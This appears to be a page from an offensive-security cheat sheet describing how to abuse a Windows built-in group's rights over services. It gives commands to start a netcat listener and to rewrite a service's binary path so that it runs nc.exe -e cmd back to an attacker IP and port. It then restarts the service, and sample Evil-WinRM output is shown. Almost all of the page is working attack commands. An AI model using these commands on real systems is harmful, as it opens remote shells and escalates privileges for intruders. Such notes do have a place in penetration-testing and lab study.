---
title: "Built-in Group"
date: 2025-7-25
tags: ["Built-In Group", "Windows", "Windows Service"]
---

#### Abuse #1. Modify Service Path

```console
# Start a nc listener
rlwrap nc -lvnp <LOCAL_PORT>
```

```console {class="sample-code"}
$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Change Service Path

```console
# Assumed nc.exe is uploaded
sc.exe config <SERVICE> binpath="C:\ProgramData\nc.exe -e cmd <LOCAL_IP> <LOCAL_PORT>"
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\ProgramData> sc.exe config VSS binpath="C:\ProgramData\nc.exe -e cmd 10.10.14.44 443"
[SC] ChangeServiceConfig SUCCESS
```

#### 2. Restart Service

```console
# Stop service
sc.exe stop <SERVICE>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\windows\tasks> sc.exe stop VSS
[SC] ControlService FAILED 1062:

The service has not been started.
```

```console
# Start service
sc.exe start <SERVICE>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\windows\tasks> sc.exe start VSS
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

{{< /tabcontent >}}
